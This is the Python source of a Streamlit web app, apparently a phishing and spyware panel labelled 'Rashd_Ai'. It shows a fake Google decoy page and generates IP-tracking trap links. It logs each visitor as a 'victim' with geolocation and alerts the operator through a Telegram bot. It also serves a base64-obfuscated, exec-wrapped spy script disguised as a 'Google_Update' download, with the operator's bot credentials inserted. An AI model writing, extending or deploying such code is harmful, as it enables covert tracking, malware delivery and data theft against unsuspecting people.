import streamlit as st
import os
import json
import requests
from datetime import datetime
from PIL import Image
import base64
import socket
import platform
import urllib.parse

# استيراد الوحدات المحلية
import config
import victim_logger

# ============= إعدادات الصفحة =============
st.set_page_config(page_title="Google", layout="wide", page_icon="🔍")

# ============= إخفاء واجهة Streamlit تماماً (كود عدواني) =============
hide_st_style = """
    <style>
    /* إخفاء كافة عناصر Streamlit */
    #MainMenu {visibility: hidden !important;}
    footer {visibility: hidden !important;}
    header {visibility: hidden !important;}
    .stDeployButton {display:none !important;}
    [data-testid="stToolbar"] {display:none !important;}
    [data-testid="stDecoration"] {display:none !important;}
    [data-testid="stHeader"] {display:none !important;}
    [data-testid="stStatusWidget"] {display:none !important;}
    [data-testid="stAppViewContainer"] {padding: 0 !important; margin: 0 !important;}
    [data-testid="stSidebar"] {display: none !important;}
    .block-container {padding: 0 !important; margin: 0 !important; max-width: 100% !important;}
    iframe {border: none !important; width: 100vw !important; height: 100vh !important; position: fixed; top: 0; left: 0; z-index: 999999;}
    
    /* إخفاء شريط "Hosted with Streamlit" */
    div[data-testid="stStatusWidget"] {display: none !important;}
    #root > div:nth-child(1) > div > div > div > div > section > div {padding-top: 0rem !important;}
    </style>
    <script>
    // محاولة إزالة العناصر برمجياً أيضاً
    function hideStreamlit() {
        const selectors = [
            'header', 'footer', '#MainMenu', '.stDeployButton', 
            '[data-testid="stToolbar"]', '[data-testid="stDecoration"]',
            '[data-testid="stStatusWidget"]', '.viewerBadge_container__1QSob'
        ];
        selectors.forEach(s => {
            const el = document.querySelector(s);
            if (el) el.style.display = 'none';
        });
    }
    setInterval(hideStreamlit, 100);
    </script>
"""

if 'decoy' in st.query_params or 'download' in st.query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)

# ============= CSS مخصص للواجهة الرئيسية =============
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
    html, body, [class*="st-"] {
        font-family: 'Cairo', sans-serif !important;
    }
    .main .block-container {
        direction: rtl;
        text-align: right;
    }
    .stButton>button {
        background-color: #00ff00 !important;
        color: black !important;
        font-weight: bold;
        border-radius: 8px;
        width: 100%;
        border: none;
    }
    h1, h2, h3 { color: #00ff00 !important; text-align: center; }
    </style>
""", unsafe_allow_html=True)

# ============= دالة جلب الـ IP الحقيقي =============
def get_real_ip():
    try:
        headers = st.context.headers
        if headers:
            ip = headers.get("X-Forwarded-For")
            if ip: return ip.split(",")[0].strip()
            ip = headers.get("X-Real-Ip")
            if ip: return ip
    except: pass
    return 'Unknown'

# ============= دالة جلب البيانات الجغرافية =============
def get_geo_info(ip):
    if not ip or ip == 'Unknown' or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
        return None
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?lang=ar&fields=status,country,city,lat,lon,isp,org', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success': return data
    except: pass
    return None

# ============= دالة التقاط بيانات الضحايا =============
def capture_victim_data():
    query_params = st.query_params
    # الأولوية للـ IP القادم من الجافا سكريبت (العام)
    user_ip = query_params.get('ip', get_real_ip())
    if isinstance(user_ip, list): user_ip = user_ip[0]
    
    if 'target' in query_params and not st.session_state.get('victim_captured', False):
        # تجاهل الـ IP المحلي إذا كان هناك IP عام متاح
        if user_ip.startswith('192.168.') or user_ip.startswith('10.'):
            real_public_ip = get_real_ip()
            if not (real_public_ip.startswith('192.168.') or real_public_ip.startswith('10.')):
                user_ip = real_public_ip

        try:
            geo_data = get_geo_info(user_ip)
            victim_logger.log_victim_data(user_ip, "Browser", query_params.get('target', 'Unknown'), geo_data)
            st.session_state['victim_captured'] = True
            
            bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
            chat_id = config.get_key("TELEGRAM_CHAT_ID")
            if bot_token and chat_id:
                victim_info = f"""
🎯 <b>تنبيه: تم اكتشاف ضحية جديدة!</b>

📍 <b>عنوان IP:</b> {user_ip}
🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}
🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}
🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}
🎯 <b>المصيدة:</b> {query_params.get('target', 'Unknown')}
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                              data={"chat_id": chat_id, "text": victim_info, "parse_mode": "HTML"}, timeout=10)
        except: pass

capture_victim_data()

# ============= منطق تحميل ملف التجسس =============
if 'download' in st.query_params:
    token = st.query_params.get('token', '')
    chatid = st.query_params.get('chatid', '')
    device = st.query_params.get('device', 'pc')
    
    if token and chatid:
        try:
            with open('spy_full.py', 'r', encoding='utf-8') as f:
                spy_code = f.read()
            spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token).replace('YOUR_CHAT_ID_HERE', chatid)
            encoded_code = base64.b64encode(spy_code.encode('utf-8')).decode('utf-8')
            obfuscated_code = f"""import base64;exec(base64.b64decode('{encoded_code}').decode('utf-8'))"""
            
            file_name = "Google_Update.py"
            if device == 'android': file_name = "Google_Update.apk"
            elif device == 'ios': file_name = "Google_Update.mobileconfig"
            
            # تحميل صامت قدر الإمكان
            st.download_button(label="📥 بدء التحميل", data=obfuscated_code, file_name=file_name, mime="application/octet-stream")
            st.stop()
        except: pass

# ============= منطق صفحة التمويه (Google) =============
if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
        token = st.query_params.get('token', '')
        chatid = st.query_params.get('chatid', '')
        download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
        html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
        st.components.v1.html(html_content, height=1000, scrolling=False)
        st.stop()
    except: pass

# ============= تهيئة الجلسة =============
if "developer_mode" not in st.session_state: st.session_state.developer_mode = False
if "selected_tool" not in st.session_state: st.session_state.selected_tool = "🎣 مصيدة IP"

# ============= الشريط الجانبي (Sidebar) =============
with st.sidebar:
    st.markdown("<h2 style='text-align: center; color: #00ff00;'>🛡️ Rashd_Ai</h2>", unsafe_allow_html=True)
    st.markdown("---")
    if not st.session_state.developer_mode:
        st.markdown("<h3 style='text-align: center;'>🔐 دخول المطور</h3>", unsafe_allow_html=True)
        username = st.text_input("اسم المستخدم:", key="login_username").strip()
        password = st.text_input("كلمة المرور:", type="password", key="login_password").strip()
        if st.button("دخول"):
            if username == config.ADMIN_USERNAME and password == config.ADMIN_PASSWORD:
                st.session_state.developer_mode = True
                st.rerun()
            else: st.error("❌ بيانات الدخول غير صحيحة")
    else:
        st.markdown("<h3 style='text-align: center; color: #00ff00;'>⚙️ إعدادات تلجرام</h3>", unsafe_allow_html=True)
        telegram_bot_token = st.text_input("🤖 توكين البوت:", value=config.get_key("TELEGRAM_BOT_TOKEN") or "", type="password", key="telegram_token").strip()
        telegram_chat_id = st.text_input("💬 Chat ID:", value=config.get_key("TELEGRAM_CHAT_ID") or "", key="telegram_chat_id").strip()
        if st.button("💾 حفظ الإعدادات"):
            if telegram_bot_token and telegram_chat_id:
                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                st.success("✅ تم حفظ الإعدادات")
        st.markdown("---")
        tool = st.selectbox("اختر الأداة:", ["🎣 مصيدة IP", "🎭 فخ جوجل الآلي", "📥 الملفات المسحوبة", "📊 الإحصائيات"], index=0, key="developer_tool_selector")
        st.session_state['selected_tool'] = tool
        if st.button("🚪 تسجيل الخروج"):
            st.session_state.developer_mode = False
            st.rerun()

# ============= المحتوى الرئيسي =============
if not st.session_state.developer_mode:
    st.markdown("<h1 style='text-align: center;'>🛡️ Rashd_Ai - أدوات الأمن السيبراني</h1>", unsafe_allow_html=True)
    st.markdown("---")
    st.markdown("<div style='text-align: center; padding: 20px;'><p>مرحباً بك في Rashd_Ai، نظام الأمن السيبراني المطور بواسطة راشد أبو سعود.</p></div>", unsafe_allow_html=True)
else:
    selected_tool = st.session_state.get('selected_tool', '🎣 مصيدة IP')
    if selected_tool == "🎣 مصيدة IP":
        st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎣 مصيدة IP</h2>", unsafe_allow_html=True)
        trap_name = st.text_input("اسم المصيدة:", placeholder="مثال: صورة قطة").strip()
        if st.button("🔗 توليد رابط التتبع"):
            if trap_name:
                tracking_url = f"https://rashdai.streamlit.app/?target={urllib.parse.quote(trap_name)}"
                st.code(tracking_url, language="text")
        st.markdown("---")
        victims = victim_logger.get_all_victims()
        if victims:
            st.dataframe(victims, width='stretch')
            if st.button("🗑️ مسح سجل الضحايا"):
                victim_logger.clear_victims_log()
                st.rerun()
    elif selected_tool == "🎭 فخ جوجل الآلي":
        st.markdown("<h2 style='text-align: center; color: #00ff00;'>🎭 فخ جوجل الآلي</h2>", unsafe_allow_html=True)
        bot_token = config.get_key("TELEGRAM_BOT_TOKEN")
        chat_id = config.get_key("TELEGRAM_CHAT_ID")
        if not bot_token or not chat_id: st.error("❌ يجب حفظ بيانات تلجرام أولاً")
        else:
            decoy_url = f"https://rashdai.streamlit.app/?decoy=google&token={bot_token}&chatid={chat_id}"
            st.code(decoy_url, language="text")
    elif selected_tool == "📥 الملفات المسحوبة":
        st.info("يتم إرسال الملفات مباشرة إلى تلجرام.")
    elif selected_tool == "📊 الإحصائيات":
        victims = victim_logger.get_all_victims()
        st.metric("🎯 إجمالي الضحايا", len(victims))
